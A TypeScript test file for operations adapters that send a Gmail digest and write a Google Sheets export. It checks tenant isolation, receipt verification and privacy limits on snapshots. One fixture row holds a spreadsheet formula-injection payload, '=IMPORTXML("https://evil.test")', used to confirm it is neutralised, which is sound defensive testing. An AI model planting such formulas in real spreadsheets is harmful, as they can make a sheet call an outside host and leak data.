import test from "node:test";
import assert from "node:assert/strict";
import { createConfiguredOperationsAdapters } from "./adapters.js";
import { exportSnapshot } from "./snapshot.js";
import { operationFingerprint } from "./payload.js";
const env = { LKB_OPERATIONS_APPROVED_TENANT: "A", LKB_OPERATIONS_EXTERNAL_ENABLE: "1", LKB_OPERATIONS_APPROVAL_REF: "fixture-authority-only", LKB_OPERATIONS_DIGEST_RECIPIENT: "operator@example.test", LKB_OPERATIONS_GWS_BINARY: process.platform === "win32" ? "C:\\fixture\\gws.exe" : "/fixture/gws", LKB_OPERATIONS_SHEETS_ID: "a".repeat(44), LKB_OPERATIONS_GOOGLE_ACCESS_TOKEN: "fixture-token" };
const snapshot = { ...exportSnapshot("A", [{ tenantId: "A", _id: "s1", title: '=IMPORTXML("https://evil.test")', date: "2026-10-14", status: { transcribe: "done", index: "done" } }]), attemptAt: "2026-10-14T00:00:00.000Z", attemptRevision: 3 };
const runId = operationFingerprint("digest", "A", snapshot, JSON.stringify([env.LKB_OPERATIONS_APPROVAL_REF, env.LKB_OPERATIONS_GWS_BINARY, env.LKB_OPERATIONS_DIGEST_RECIPIENT]));
test("constructor/disabled/foreign tenant never invokes external transport", async () => {
  let calls = 0; const io = { mail: async () => { calls++; return {}; }, sheets: async () => { calls++; return {}; } };
  const adapters = createConfiguredOperationsAdapters({}, io); assert.equal(adapters.digest.available("A"), false); assert.equal(calls, 0);
  await assert.rejects(adapters.digest.execute({ tenant: "A", runId, snapshot, signal: new AbortController().signal }));
  const configured = createConfiguredOperationsAdapters(env, io); assert.equal(configured.sheets.available("B"), false);
  await assert.rejects(configured.sheets.execute({ tenant: "B", runId, snapshot, signal: new AbortController().signal })); assert.equal(calls, 0);
});
test("Gmail accepted send alone cannot establish success; actual message/header/body receipt is checked", async () => {
  let raw = "", count = 0;
  const adapters = createConfiguredOperationsAdapters(env, { sheets: async () => ({}), mail: async (_binary, args) => {
    count++; if (args.includes("send")) { raw = Buffer.from(JSON.parse(args.at(-1)!).raw, "base64url").toString("utf8"); return { id: "mail1" }; }
    if (args.includes("list")) return { messages: [{ id: "mail1" }] };
    const body = Buffer.from(raw.split("\r\n\r\n")[1]!.trim(), "base64").toString("utf8");
    return { id: "mail1", labelIds: ["SENT"], payload: { headers: [{ name: "To", value: "operator@example.test" }, { name: "Message-ID", value: `<${runId}@knowledgebase.local>` }], body: { data: Buffer.from(body).toString("base64url") } } };
  } });
  await adapters.digest.execute({ tenant: "A", runId, snapshot, signal: new AbortController().signal }); assert.equal(count, 2); assert.equal(raw.includes("evil.test"), false);
  assert.equal(await adapters.digest.verifyReceipt!({ tenant: "A", runId, attemptAt: snapshot.attemptAt, attemptRevision: 3, signal: new AbortController().signal }), true);
  const bad = createConfiguredOperationsAdapters(env, { sheets: async () => ({}), mail: async () => ({ id: "mail1" }) });
  await assert.rejects(bad.digest.execute({ tenant: "A", runId, snapshot, signal: new AbortController().signal }));
});
test("Sheets RAW bounded dedicated range clears old rows and verifies exact snapshot readback", async () => {
  const sheetRunId = operationFingerprint("sheets", "A", snapshot, JSON.stringify([env.LKB_OPERATIONS_APPROVAL_REF, env.LKB_OPERATIONS_SHEETS_ID, "'Knowledge Bank Export'!A1:E502"]));
  let expected: unknown[][] = [], count = 0;
  const adapters = createConfiguredOperationsAdapters(env, { mail: async () => ({}), sheets: async (url, _token, method, body) => {
    count++; assert.ok(url.startsWith("https://sheets.googleapis.com/v4/spreadsheets/"));
    if (method === "PUT") { assert.ok(url.endsWith("valueInputOption=RAW")); const input = body as { values: unknown[][] }; assert.equal(input.values.length, 502); expected = structuredClone(input.values.slice(0, 3)); return { spreadsheetId: env.LKB_OPERATIONS_SHEETS_ID, updatedRows: 502 }; }
    return { values: expected };
  } });
  await adapters.sheets.execute({ tenant: "A", runId: sheetRunId, snapshot, signal: new AbortController().signal }); assert.equal(count, 2); assert.equal(expected[2]?.[1], snapshot.rows[1]?.[1]);
  const bad = createConfiguredOperationsAdapters(env, { mail: async () => ({}), sheets: async (_url, _token, method) => method === "PUT" ? { spreadsheetId: env.LKB_OPERATIONS_SHEETS_ID, updatedRows: 502 } : { values: [["FOREIGN"]] } });
  await assert.rejects(bad.sheets.execute({ tenant: "A", runId: sheetRunId, snapshot, signal: new AbortController().signal }));
  assert.equal(await adapters.sheets.verifyReceipt!({ tenant: "A", runId: sheetRunId, attemptAt: snapshot.attemptAt, attemptRevision: 3, signal: new AbortController().signal }), true);
  expected[2]![1] = "tampered"; assert.equal(await adapters.sheets.verifyReceipt!({ tenant: "A", runId: sheetRunId, attemptAt: snapshot.attemptAt, attemptRevision: 3, signal: new AbortController().signal }), false);
});
test("privacy export refuses foreign rows and large/malformed IDs, retaining only allowed fields", () => {
  assert.throws(() => exportSnapshot("A", [{ tenantId: "B", _id: "secret", title: "secret", date: "" }]));
  assert.throws(() => exportSnapshot("A", [{ tenantId: "A", _id: "a".repeat(513), title: "", date: "" }]));
  assert.equal(JSON.stringify(snapshot).includes("tenantId"), false);
  assert.equal(snapshot.ready, 1);
  assert.throws(() => exportSnapshot("A", Array.from({ length: 500 }, (_, index) => ({ tenantId: "A", _id: `big-${index}`, title: "界".repeat(2000), date: "" }))));
});
